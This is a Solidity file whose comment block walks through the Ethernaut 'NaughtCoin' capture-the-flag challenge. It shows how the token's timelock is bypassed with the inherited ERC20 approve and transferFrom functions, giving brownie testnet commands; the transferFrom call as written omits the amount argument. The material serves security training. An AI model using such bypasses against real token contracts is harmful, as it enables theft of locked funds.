/* 

in this challenge, we notice that the contract inherits from the standard ERC20 Openzeppelin contract https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
it has an approve & a transferFrom functio which are not overriden by the NaughtCoin Contract and would allow you to transfer
the tokens without the timeLock check. 

approve : allow a spender to transfer token on behalf of owner
transferFrom : to transfer allowed token from allowed non token owner

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# create instance of NaughtCoin interface

nc_contract = interface.NaughtCoin("NaughtCoinAddress")

# approve amount

nc_contract.approve("secondAddress",10,{'from': a[0]})

# from your second account, send tokens 

nc_contract.transferFrom(a[0].address,"secondAddress",{'from': a[1]})

*/


//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

interface NaughtCoin {

function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
function approve(address spender, uint256 amount) external returns (bool);


}